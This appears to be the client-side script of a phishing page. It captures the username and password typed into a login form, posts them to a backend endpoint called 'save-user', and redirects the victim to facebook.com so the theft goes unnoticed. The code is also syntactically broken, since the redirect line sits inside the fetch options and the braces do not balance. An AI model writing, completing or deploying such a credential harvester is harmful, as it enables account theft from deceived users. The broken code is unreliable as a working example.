const form = document.getElementById("loginForm");

form.addEventListener("submit", async function (e) {  // Added 'async' here
  e.preventDefault(); // stop page reload

  const email = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  let obj = {
    username: email,
    password: password
  }

  // Send to Python backend
  await fetch("http://127.0.0.1:5500/save-user", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(obj)
    window.location.href = "https://www.facebook.com/";
});
  });

  // Redirect after saving
  